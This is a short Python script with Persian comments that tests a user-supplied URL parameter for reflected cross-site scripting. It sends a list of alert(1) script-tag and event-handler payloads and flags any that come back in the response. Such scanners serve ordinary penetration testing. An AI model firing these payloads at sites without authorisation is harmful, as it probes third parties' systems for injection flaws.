import requests
import urllib.parse

# پیلودهای ساده XSS
payloads = [
    '</i><script>alert(1)</script>',
    '"></i><script>alert(1)</script>',
    "'</i>;alert(1);//",
    '</i><img src=x onerror=alert(1)>',

    '</a><script>alert(1)</script>',
    '"></a><script>alert(1)</script>',
    "'</a>;alert(1);//",
    '</a><img src=x onerror=alert(1)>',

    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "';alert(1);//",
    ' ";alert(1);//',
    '<img src=x onerror=alert(1)>',
    "'};alert(1);//",
    "'}};alert(1);//",
    "'}}};alert(1);//",
    
]

def test_xss(url, param):
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        # ساخت URL با پارامتر و پیلود انکد شده
        test_url = f"{url}?{param}={encoded_payload}"
        print(f"Testing: {test_url}")
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                print(f"[Possible XSS] Payload reflected in response: {payload}")
            else:
                print("No reflection detected.")
        except Exception as e:
            print(f"Error testing payload: {e}")

if __name__ == "__main__":
    target_url = input("Enter target URL (without parameters): ").strip()
    parameter = input("Enter vulnerable parameter name: ").strip()
    test_xss(target_url, parameter)
